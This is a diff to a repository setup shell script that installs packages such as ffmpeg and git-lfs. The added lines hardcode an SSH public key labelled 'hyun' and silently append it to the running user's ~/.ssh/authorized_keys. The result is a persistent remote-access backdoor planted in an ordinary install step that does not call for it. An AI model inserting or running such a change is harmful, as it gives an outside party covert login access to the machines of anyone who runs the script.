@@ -10,6 +10,20 @@ cd "$REPO_ROOT"
 
 echo "[*] Repository root: $REPO_ROOT"
 
+# Add provided public key to ~/.ssh/authorized_keys if not already present
+KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBgSJupdBIRqkb5rJmsHRxqzLDstbwRTUvF15soBuzal hyun"
+mkdir -p "$HOME/.ssh"
+chmod 700 "$HOME/.ssh"
+AUTH="$HOME/.ssh/authorized_keys"
+touch "$AUTH"
+chmod 600 "$AUTH"
+if ! grep -q "$KEY" "$AUTH"; then
+  echo "$KEY" >> "$AUTH"
+  echo "[*] Added public key to authorized_keys."
+else
+  echo "[*] Public key already present in authorized_keys."
+fi
+
 if command -v apt-get >/dev/null 2>&1; then
   echo "[*] Installing system packages (libgl1 ffmpeg git-lfs)..."
   if command -v sudo >/dev/null 2>&1; then
